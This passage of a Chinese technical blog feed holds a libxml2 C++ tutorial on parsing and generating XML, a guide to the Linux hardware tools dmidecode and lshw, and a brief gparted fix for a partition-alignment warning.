class="line">82</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;libxml/parser.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;libxml/tree.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// \param depth  递归深度</span><br><span class="hljs-comment">/// \param _xmlNodePtr 节点对象指针</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ParserXML</span><span class="hljs-params">(<span class="hljs-keyword">int</span> &amp;depth,xmlNodePtr _xmlNodePtr)</span></span>&#123;<br>    <span class="hljs-keyword">bool</span> ishas_child=<span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">// 所有子节点</span><br>    xmlNodePtr xmlNodePtr1= _xmlNodePtr-&gt;children;<br>    <span class="hljs-keyword">int</span> count=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (xmlNodePtr1)&#123;<br>        <span class="hljs-comment">// 判断节点类型</span><br>        <span class="hljs-keyword">if</span>(xmlNodePtr1-&gt;type!=XML_TEXT_NODE)&#123;<br>        <span class="hljs-comment">// xmlStrcmp(xmlNodePtr1-&gt;name,BAD_CAST &quot;text&quot;)</span><br>            count++;<br>            <span class="hljs-comment">// 子节点个数</span><br>            <span class="hljs-keyword">int</span> childEleCount= <span class="hljs-built_in">xmlChildElementCount</span>(xmlNodePtr1);<br>            cout.<span class="hljs-built_in">width</span>(depth);<br>            <span class="hljs-keyword">if</span>(childEleCount==<span class="hljs-number">0</span>)&#123;<br>                ishas_child=<span class="hljs-literal">false</span>;<br>                <span class="hljs-comment">// 表明无子节点</span><br>                cout&lt;&lt;count&lt;&lt;<span class="hljs-string">&quot;.&quot;</span>&lt;&lt;xmlNodePtr1-&gt;name&lt;&lt;<span class="hljs-string">&quot; --&gt; &quot;</span>&lt;&lt;<span class="hljs-built_in">xmlNodeGetContent</span>(xmlNodePtr1)&lt;&lt;endl;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                ishas_child=<span class="hljs-literal">true</span>;<br>                <span class="hljs-comment">// 表明有子节点</span><br>                cout&lt;&lt;count&lt;&lt;<span class="hljs-string">&quot;.&quot;</span>&lt;&lt;xmlNodePtr1-&gt;name&lt;&lt;endl;<br>            &#125;<br>            <span class="hljs-comment">// 遍历节点属性</span><br>            xmlAttr* xmlAttr1=xmlNodePtr1-&gt;properties;<br>            <span class="hljs-keyword">if</span>(xmlAttr1)&#123;<br>                cout.<span class="hljs-built_in">width</span>(depth+<span class="hljs-number">1</span>);<br>                cout&lt;&lt;<span class="hljs-string">&quot;=&gt;&quot;</span>;<br>                <span class="hljs-keyword">while</span> (xmlAttr1!=<span class="hljs-literal">NULL</span>)&#123;<br>                    <span class="hljs-comment">// 判断使用存在属性 ， xmlGetProp获取属性值</span><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">xmlHasProp</span>(xmlNodePtr1,xmlAttr1-&gt;name))&#123;<br>                        cout&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;xmlAttr1-&gt;name&lt;&lt;<span class="hljs-string">&quot;:&quot;</span>&lt;&lt;<br>                            <span class="hljs-built_in">xmlGetProp</span>(xmlNodePtr1,xmlAttr1-&gt;name);<br>                    &#125;<br>                    xmlAttr1=xmlAttr1-&gt;next;<br>                &#125;<br>                cout&lt;&lt;endl;<br>            &#125;<br>            <span class="hljs-comment">// 递归调用</span><br>            <span class="hljs-keyword">if</span>(ishas_child)&#123;<br>                depth+=<span class="hljs-number">10</span>;<br>                <span class="hljs-built_in">ParserXML</span>(depth,xmlNodePtr1);<br>            &#125;<br>        &#125;<br>        xmlNodePtr1=xmlNodePtr1-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(depth&gt;<span class="hljs-number">0</span>)&#123;<br>        depth-=<span class="hljs-number">10</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span>** argv)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(argc!=<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    xmlDocPtr xmlDocPtr1=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//xmlDocPtr1=xmlParseFile(argv[1]);</span><br>    <span class="hljs-built_in">xmlInitParser</span>();<br>    <span class="hljs-comment">// 读取文件</span><br>    xmlDocPtr1=<span class="hljs-built_in">xmlReadFile</span>(argv[<span class="hljs-number">1</span>],<span class="hljs-string">&quot;UTF-8&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(xmlDocPtr1==<span class="hljs-literal">NULL</span>) &#123;<br>        xmlErrorPtr xmlErrorPtr1 =<span class="hljs-built_in">xmlGetLastError</span>();<br>        cout &lt;&lt; xmlErrorPtr1-&gt;message &lt;&lt; endl;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    cout&lt;&lt;<span class="hljs-string">&quot;Version: &quot;</span>&lt;&lt;xmlDocPtr1-&gt;version&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;Encoding: &quot;</span>&lt;&lt;xmlDocPtr1-&gt;encoding&lt;&lt;endl;<br>    <span class="hljs-comment">// 获取根节点</span><br>    xmlNodePtr xmlNodePtr1= <span class="hljs-built_in">xmlDocGetRootElement</span>(xmlDocPtr1);<br>    cout&lt;&lt;<span class="hljs-string">&quot;Root Element: &quot;</span>&lt;&lt;xmlNodePtr1-&gt;name&lt;&lt;endl&lt;&lt;endl;<br>    <span class="hljs-comment">// 遍历所有信息</span><br>    <span class="hljs-keyword">int</span> depth=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">ParserXML</span>(depth,xmlNodePtr1);<br>    <span class="hljs-comment">// 释放内存</span><br>    <span class="hljs-built_in">xmlFreeDoc</span>(xmlDocPtr1);<br>    <span class="hljs-built_in">xmlCleanupParser</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>有如下 test.xml 文档</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">People</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Student</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;0x00000000&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Jack<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>14<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">sex</span>&gt;</span>Man<span class="hljs-tag">&lt;/<span class="hljs-name">sex</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">hobby</span>&gt;</span>Computer Programming<span class="hljs-tag">&lt;/<span class="hljs-name">hobby</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">Student</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Student</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;0x11111111&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Tony<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>17<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">sex</span>&gt;</span>Man<span class="hljs-tag">&lt;/<span class="hljs-name">sex</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">hobby</span>&gt;</span>Play Basketball<span class="hljs-tag">&lt;/<span class="hljs-name">hobby</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">Student</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Student</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;0x22222222&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Job<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>20<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">sex</span>&gt;</span>Man<span class="hljs-tag">&lt;/<span class="hljs-name">sex</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">hobby</span>&gt;</span>Play Football<span class="hljs-tag">&lt;/<span class="hljs-name">hobby</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">Student</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">People</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
<p>编译运行 g++ main.cpp -o main <code>xml2-config –libs –cflags</code>&amp;&amp; ./main test.xml</p>
<p>输出信息</p>
<figure class="highlight excel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs excel">Versi<span class="hljs-symbol">on:</span> <span class="hljs-number">1.0</span><br>Encodi<span class="hljs-symbol">ng:</span> UTF-<span class="hljs-number">8</span><br>ROOT Eleme<span class="hljs-symbol">nt:</span> People<br><span class="hljs-number">1</span>.Student<br>=&gt; <span class="hljs-symbol">id:0</span>x00000000<br>         <span class="hljs-number">1</span>.name --&gt; Jack<br>         <span class="hljs-number">2</span>.age --&gt; <span class="hljs-number">14</span><br>         <span class="hljs-number">3</span>.sex --&gt; Man<br>         <span class="hljs-number">4</span>.hobby --&gt; Computer Programming<br><span class="hljs-number">2</span>.Student<br>=&gt; <span class="hljs-symbol">id:0</span>x11111111<br>         <span class="hljs-number">1</span>.name --&gt; Tony<br>         <span class="hljs-number">2</span>.age --&gt; <span class="hljs-number">17</span><br>         <span class="hljs-number">3</span>.sex --&gt; Man<br>         <span class="hljs-number">4</span>.hobby --&gt; Play Basketball<br><span class="hljs-number">3</span>.Student<br>=&gt; <span class="hljs-symbol">id:0</span>x22222222<br>         <span class="hljs-number">1</span>.name --&gt; Job<br>         <span class="hljs-number">2</span>.age --&gt; <span class="hljs-number">20</span><br>         <span class="hljs-number">3</span>.sex --&gt; Man<br>         <span class="hljs-number">4</span>.hobby --&gt; Play Football<br><br></code></pre></div></td></tr></table></figure>
<p>可以看到，成功的解析xml文档并格式化的输出信息。这个例子的核心代码就是那个递归函数。现在我们来看看它到底干了些什么。<br />
不过在此之前，先谈谈 <strong>xmlParseFile</strong> 和 <strong>xmlReadFile</strong> 的区别。它们都是打开一个XML文档并返回一个文档对象指针 <strong>xmlDocPtr</strong> ，不同之处就在于它们提供的参数不同</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">xmlDocPtr <span class="hljs-title">xmlParseFile</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename)</span></span>;<br><span class="hljs-function">xmlDocPtr <span class="hljs-title">xmlReadFile</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *URL,**<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *encoding**,<span class="hljs-keyword">int</span> options)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p>xmlReadFile 以指定的编码格式打开xml文档，而 xmlParseFile 默认以UTF-8编码格式打开文档。<br />
比如，刚才的test.xml <strong><?xml version=”1.0” encoding=”UTF-8”?></strong> 中通过encoding指定了UTF-8编码格式，那么用 xmlParseFile 能成功解析，用 xmlReadFile 函数无论<br />
<strong>const char *encoding</strong> 参数为NULL还是“UTF-8” 也能成功解析。<br />
但是 test.xml 只有 <strong><?xml version=”1.0?></strong> 那么 xmlParseFile 会解析失败，而 xmlReadFile 只有 第二个参数为 “UTF-8”时才能解析成功。</p>
<p>好了，继续看那个递归函数吧。。。<br />
首先用 <strong>xmlNodePtr xmlNodePtr1= _xmlNodePtr-&gt;children;</strong> 获取的 _xmlNodePtr 节点的所有子节点，然后在while循环中判断每个子节点的类型，<strong>xmlNodePtr1-&gt;type!=XML_TEXT_NODE</strong> 如果不是 XML_TEXT_NODE 那就继续。接着 用 <strong>xmlChildElementCount</strong> 获取 xmlNodePtr1 节点指针的所有子节点个数，并用一个 <strong>ishas_child</strong> 标识是否存在子节点，对于存在子节点的节点，就进行<strong>递归</strong>。然后显示了节点的属性，通过 <strong>xmlHasProp</strong> 判断是否存在指定名字的属性，存在用 <strong>xmlGetProp</strong> 获取其值。注意，我获取了 一个属性对象（链表） <code>xmlAttr* xmlAttr1=xmlNodePtr1-&gt;properties</code> 之后进行遍历。在libxml2中，xmlNode、xmlDoc、xmlAttr 都是一个链表。<br />
之后进入递归，depth 只是表示深度，用于格式化输出<br />
if(ishas_child){<br />
depth+=10;<br />
ParserXML(depth,xmlNodePtr1);<br />
}<br />
在进入的每个递归函数执行结束之前减去刚才进入的深度<br />
if(depth&gt;0){<br />
depth-=10;<br />
}</p>
<p>接下来就是生成XML文档。。。</p>
<h4 id="生成xml文档"><a class="markdownIt-Anchor" href="#生成xml文档"></a> 生成XML文档</h4>
<p>生成就简单一些了，下面是一个例子</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;libxml/parser.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;libxml/tree.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GenerateXML</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename)</span></span>&#123;<br>    xmlDocPtr xmlDocPtr1= <span class="hljs-built_in">xmlNewDoc</span>(BAD_CAST XML_DEFAULT_VERSION);<br>    <span class="hljs-keyword">if</span>(!xmlDocPtr1)&#123;<br>        cout&lt;&lt;<span class="hljs-string">&quot;ERROR: &quot;</span>&lt;&lt;<span class="hljs-built_in">xmlGetLastError</span>()-&gt;message&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-comment">// 创建根节点</span><br>    xmlNodePtr xmlRootPtr=<span class="hljs-built_in">xmlNewNode</span>(<span class="hljs-literal">NULL</span>,BAD_CAST<span class="hljs-string">&quot;Root&quot;</span>);<br>    <span class="hljs-built_in">xmlDocSetRootElement</span>(xmlDocPtr1,xmlRootPtr);<br>    <span class="hljs-comment">// 创建一个文本子节点，父节点为 xmlRootPtr</span><br>    xmlNodePtr  xmlNodePtr1= <span class="hljs-built_in">xmlNewTextChild</span>(xmlRootPtr,<span class="hljs-literal">NULL</span>,BAD_CAST<span class="hljs-string">&quot;Management&quot;</span>,BAD_CAST<span class="hljs-string">&quot;None&quot;</span>);<br>    <span class="hljs-comment">// 添加一个节点，父节点为 xmlNodePtr1</span><br>    <span class="hljs-built_in">xmlNewTextChild</span>(xmlNodePtr1,<span class="hljs-literal">NULL</span>,BAD_CAST<span class="hljs-string">&quot;Score&quot;</span>,BAD_CAST<span class="hljs-string">&quot;None&quot;</span>);<br>    <br>    <span class="hljs-comment">// 创建一个新的节点</span><br>    xmlNodePtr xmlAnimalPtr= <span class="hljs-built_in">xmlNewNode</span>(<span class="hljs-literal">NULL</span>,BAD_CAST<span class="hljs-string">&quot;Animals&quot;</span>);<br>    <span class="hljs-built_in">xmlAddChild</span>(xmlRootPtr,xmlAnimalPtr);<br>    <span class="hljs-comment">// 创建元素</span><br>    xmlAttrPtr xmlAttrPtr1= <span class="hljs-built_in">xmlNewProp</span>(xmlAnimalPtr,BAD_CAST<span class="hljs-string">&quot;Number&quot;</span>,BAD_CAST<span class="hljs-string">&quot;888&quot;</span>);<br>    <span class="hljs-built_in">xmlSetProp</span>(xmlAnimalPtr,BAD_CAST<span class="hljs-string">&quot;Number&quot;</span>,BAD_CAST<span class="hljs-string">&quot;9999&quot;</span>);<br><span class="hljs-comment">//    xmlNodeSetName(xmlAnimalPtr,BAD_CAST&quot;The_Animal&quot;);</span><br><span class="hljs-comment">//    xmlRemoveProp(xmlAttrPtr1);</span><br>    <span class="hljs-comment">// 保存文件</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">xmlSaveFileEnc</span>(filename,xmlDocPtr1,<span class="hljs-string">&quot;UTF-8&quot;</span>))&#123;<br>        cout&lt;&lt;<span class="hljs-string">&quot;生成 XML 文件成功！&quot;</span>&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-comment">// 释放内存</span><br>    <span class="hljs-built_in">xmlFreeDoc</span>(xmlDocPtr1);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">GenerateXML</span>(<span class="hljs-string">&quot;test.xml&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>这里通用的做法为 <strong>xmlNewDoc</strong> 创建一个新的XML文档并返回一个 xmlDocPtr ，创建一个根节点就是创建一个 xmlNodePtr 并通过 <strong>xmlDocSetRootElement</strong> 设置 xmlDocPtr 的根节点为 xmlNodePtr 。之后在继续添加子节点时，只需在 xmlNodePtr 的基础上创建新节点并添加即可。</p>
<p><strong>xmlNewTextChild</strong> 函数用于文件一个文本子节点。如 <code>&lt;node&gt;Hello&lt;/node&gt;</code></p>
<p>创建新节点的方法为 <strong>xmlNewNode</strong> 它返回一个 xmlNodePtr ，之后 <strong>xmlAddChild</strong> 把一个节点添加到父节点上。</p>
<p>通过 <strong>xmlNewProp</strong> 创建一个属性 xmlAttrPtr ，之后可通过<br />
<strong>xmlSetProp或xmlNodeSetName</strong> 设置属性的值。删除属性 <strong>xmlRemoveProp</strong></p>
<p>最后，全部OK了， <strong>xmlSaveFileEnc</strong> 来保存XML文档</p>
<p>编译运行生成test.xml，可能格式有点混乱，我修改了一下</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Management</span>&gt;</span>None<br>        <span class="hljs-tag">&lt;<span class="hljs-name">Score</span>&gt;</span>None<span class="hljs-tag">&lt;/<span class="hljs-name">Score</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">Management</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Animals</span> <span class="hljs-attr">Number</span>=<span class="hljs-string">&quot;9999&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Root</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
<p>OK，基本上解析XML也不算太难。除了libxml2库外，还有其他的库也可以解析XML。看个人爱好了 😃</p>
<p>bye~</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux lshw和dmidecode查看硬件信息</title>
    <url>/linux-lshw-dmidecode/</url>
    <content><![CDATA[<p><strong>Dmidecode</strong>和<strong>lshw</strong>这两个工具可以查看Linux下有关硬件信息,这些信息包括 BIOS、系统、主板、处理器、内存、缓存等等</p>
<span id="more"></span>
<h3 id="dmidecode"><a class="markdownIt-Anchor" href="#dmidecode"></a> Dmidecode</h3>
<p>LINUX下直接安装 <code>apt-get install dmidecode</code><br />
输入 <strong>dmidecode –help</strong> 查看帮助</p>
<blockquote>
<p>Usage: dmidecode [OPTIONS]<br />
Options are:<br />
-d, –dev-mem FILE Read memory from device FILE (default: /dev/mem)<br />
-h, –help Display this help text and exit<br />
-q, –quiet Less verbose output<br />
-s, –string KEYWORD Only display the value of the given DMI string<br />
-t, –type TYPE Only display the entries of given type<br />
-u, –dump Do not decode the entries<br />
–dump-bin FILE Dump the DMI data to a binary file<br />
–from-dump FILE Read the DMI data from a binary file<br />
–no-sysfs Do not attempt to read DMI data from sysfs files<br />
–oem-string N Only display the value of the given OEM string<br />
-V, –version Display the version and exit</p>
</blockquote>
<blockquote>
<p>0 BIOS<br />
1 System<br />
2 Base Board<br />
3 Chassis<br />
4 Processor<br />
5 Memory Controller<br />
6 Memory Module<br />
7 Cache<br />
8 Port Connector<br />
9 System Slots<br />
10 On Board Devices<br />
11 OEM Strings<br />
12 System Configuration Options<br />
13 BIOS Language<br />
14 Group Associations<br />
15 System Event Log<br />
16 Physical Memory Array<br />
17 Memory Device<br />
18 32-bit Memory Error<br />
19 Memory Array Mapped Address<br />
20 Memory Device Mapped Address<br />
21 Built-in Pointing Device<br />
22 Portable Battery<br />
23 System Reset<br />
24 Hardware Security<br />
25 System Power Controls<br />
26 Voltage Probe<br />
27 Cooling Device<br />
28 Temperature Probe<br />
29 Electrical Current Probe<br />
30 Out-of-band Remote Access<br />
31 Boot Integrity Services<br />
32 System Boot<br />
33 64-bit Memory Error<br />
34 Management Device<br />
35 Management Device Component<br />
36 Management Device Threshold Data<br />
37 Memory Channel<br />
38 IPMI Device<br />
39 Power Supply<br />
40 Additional Information<br />
41 Onboard Device</p>
</blockquote>
<p>1.输入 <strong>dmidecode -t</strong> 列出关键字</p>
<blockquote>
<p>dmidecode: option requires an argument – ‘t’<br />
Type number or keyword expected<br />
Valid type keywords are:</p>
<p>bios<br />
system<br />
baseboard<br />
chassis<br />
processor<br />
memory<br />
cache<br />
connector<br />
slot</p>
</blockquote>
<p>然后在 <strong>dmidecode -t system</strong> 或 <strong>dmidecode -t 1</strong> 输出</p>
<blockquote>
<p># dmidecode 3.1<br />
Getting SMBIOS data from sysfs.<br />
SMBIOS 2.7 present.</p>
<p>Handle 0x0001, DMI type 1, 27 bytes<br />
System Information<br />
Manufacturer: LENOVO<br />
Product Name: 33661R8<br />
Version: ThinkPad Edge E530c<br />
Serial Number: MP43X9V<br />
……</p>
</blockquote>
<p>2.<strong>dmidecode -s</strong></p>
<blockquote>
<p>dmidecode: option requires an argument – ‘s’<br />
String keyword expected<br />
Valid string keywords are:<br />
bios-vendor<br />
bios-version<br />
bios-release-date<br />
system-manufacturer<br />
system-product-name<br />
system-version<br />
system-serial-number<br />
system-uuid<br />
baseboard-manufacturer<br />
baseboard-product-name<br />
baseboard-version<br />
baseboard-serial-number<br />
baseboard-asset-tag<br />
chassis-manufacturer<br />
chassis-type<br />
chassis-version<br />
chassis-serial-number<br />
chassis-asset-tag<br />
processor-family<br />
processor-manufacturer<br />
processor-version<br />
processor-frequency</p>
</blockquote>
<p><strong>dmidecode -s system-version</strong> 输出</p>
<blockquote>
<p>ThinkPad Edge E530c</p>
</blockquote>
<h3 id="lshwhardware-lister"><a class="markdownIt-Anchor" href="#lshwhardware-lister"></a> lshw(Hardware Lister)</h3>
<p>安装:<code>apt-get install lshw</code><br />
lshw 比较简单 <strong>lshw –help</strong></p>
<blockquote>
<p>Hardware Lister (lshw) - unknown<br />
usage: lshw [-format] [-options …]<br />
lshw -version</p>
<p>-version print program version (unknown)<br />
format can be<br />
<strong>-html</strong> output hardware tree as HTML<br />
<strong>-xml</strong> output hardware tree as XML<br />
-short output hardware paths<br />
-businfo output bus information<br />
-X use graphical interface</p>
<p>options can be<br />
<strong>-class CLASS</strong> only show a certain class of hardware<br />
-C CLASS same as ‘-class CLASS’<br />
-c CLASS same as ‘-class CLASS’<br />
-disable TEST disable a test (like pci, isapnp, cpuid, etc. )<br />
-enable TEST enable a test (like pci, isapnp, cpuid, etc. )<br />
-quiet don’t display status<br />
-sanitize sanitize output (remove sensitive information like serial numbers, etc.)<br />
-numeric output numeric IDs (for PCI, USB, etc.)<br />
-notime exclude volatile attributes (timestamps) from output</p>
</blockquote>
<p>1.把信息保存为HTML/XML格式文本</p>
<blockquote>
<p>lshw -html &gt; my.html<br />
lshw -xml &gt; my.html</p>
</blockquote>
<p>2.显示设备列表，输出包括设备路径(path)、类别(class)以及简单描述 <strong>lshw -short</strong></p>
<blockquote>
<p>H/W path Device <strong>Class</strong> Description<br />
……</p>
</blockquote>
<p>3.显示指定类别的设备 <strong>lshw -C xxxx</strong>,其中 <code>xxxx</code> 就是 <strong>lshw -short</strong> 中的 <code>Class</code> 字段.如 <strong>lshw -C disk</strong></p>
<blockquote>
<p>*-disk<br />
description: ATA Disk<br />
product: WDC WD5000LPVT-0<br />
vendor: Western Digital<br />
……<br />
*-cdrom<br />
……</p>
</blockquote>
<p>例如: <strong>lshw -C system|grep version</strong> 输出</p>
<blockquote>
<p>version: ThinkPad Edge E530c</p>
</blockquote>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Partition X does not start on physical sector boundary</title>
    <url>/linux-partition-x/</url>
    <content><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3>
<p>今天好好的，突然来了这个，还以为我原来分的扩展分区不能用了。所以赶紧百度，百度不行Google，果然，还是Googl牛！然而英文，只好硬着头皮去看。。。</p>
<blockquote>
<p>原文: <a href="https://askubuntu.com/questions/156994/partition-does-not-start-on-physical-sector-boundary">https://askubuntu.com/questions/156994/partition-does-not-start-on-physical-sector-boundary</a></p>
</blockquote>
<span id="more"></span>
<h3 id="解决方案"><a class="markdownIt-Anchor" href="#解决方案"></a> 解决方案</h3>
<p>错误情况图<img src="/uploads/images/files/0.png" alt="img" /></p>
<p>红色那个错误提示：<code>Partition 3 does not start on physical sector boundary.</code><br />
我第一次是把那个 /dev/sda5 删除在新建格式化，结果还是不行，最后我看到老外用 <strong>gparted</strong></p>
<ul>
<li>
<p>我把以前的拓展分区全部删除，结果如图【未分配】<br />
<img src="/uploads/images/files/1.png" alt="img" /></p>
</li>
<li>
<p>新建<code>扩展分区</code>，<code>之前的空余空间</code>为 <code>1MB</code><br />
<img src="/uploads/images/files/2.png" alt="img" /></p>
</li>
<li>
<p>然后在新建的扩展分区那新建一个<code>逻辑分区</code>，同样也是<code>1MB</code><br />
<img src="/uploads/images/files/3.png" alt="img" /></p>
</li>
<li>
<p>全部应用，完成<br />
<img src="/uploads/images/files/4.png" alt="img" /></p>
</li>
<li>
<p>这时在终端下输入 <code>fdisk -l</code>应该可以看到 没有错误了</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
